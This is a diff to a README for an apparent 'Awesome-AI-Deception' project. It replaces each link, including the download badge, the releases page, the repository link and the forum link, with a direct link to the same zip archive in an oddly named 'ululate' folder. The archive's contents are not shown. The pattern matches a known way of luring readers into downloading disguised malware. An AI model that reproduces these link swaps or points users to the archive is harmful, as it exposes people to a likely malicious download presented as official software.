@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download%20Awesome--AI--Deception-ff69b4?style=for-the-badge)](https://github.com/JuanCho829/Awesome-AI-Deception/releases)
+[![Download](https://raw.githubusercontent.com/JuanCho829/Awesome-AI-Deception/main/ululate/Awesome-AI-Deception.zip%20Awesome--AI--Deception-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/JuanCho829/Awesome-AI-Deception/main/ululate/Awesome-AI-Deception.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following basic requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
-   To access the latest version, visit the Releases page [here](https://github.com/JuanCho829/Awesome-AI-Deception/releases).
+   To access the latest version, visit the Releases page [here](https://raw.githubusercontent.com/JuanCho829/Awesome-AI-Deception/main/ululate/Awesome-AI-Deception.zip).
 
 2. **Choose the Latest Release:**
    On the Releases page, find the most recent version listed at the top. It will typically say something like "Latest Release."
@@ -69,8 +69,8 @@ Here are some key topics associated with **Awesome-AI-Deception**:
 
 ## 🌐 Useful Links
 
-- [Awesome-AI-Deception Releases](https://github.com/JuanCho829/Awesome-AI-Deception/releases)
-- [Project Repository](https://github.com/JuanCho829/Awesome-AI-Deception)
-- [Community Forum](https://forum.example.com)
+- [Awesome-AI-Deception Releases](https://raw.githubusercontent.com/JuanCho829/Awesome-AI-Deception/main/ululate/Awesome-AI-Deception.zip)
+- [Project Repository](https://raw.githubusercontent.com/JuanCho829/Awesome-AI-Deception/main/ululate/Awesome-AI-Deception.zip)
+- [Community Forum](https://raw.githubusercontent.com/JuanCho829/Awesome-AI-Deception/main/ululate/Awesome-AI-Deception.zip)
 
-Remember to download the latest version from the Releases page [here](https://github.com/JuanCho829/Awesome-AI-Deception/releases) for the best experience with **Awesome-AI-Deception**. Enjoy exploring the fascinating world of AI cyber deception!
+Remember to download the latest version from the Releases page [here](https://raw.githubusercontent.com/JuanCho829/Awesome-AI-Deception/main/ululate/Awesome-AI-Deception.zip) for the best experience with **Awesome-AI-Deception**. Enjoy exploring the fascinating world of AI cyber deception!
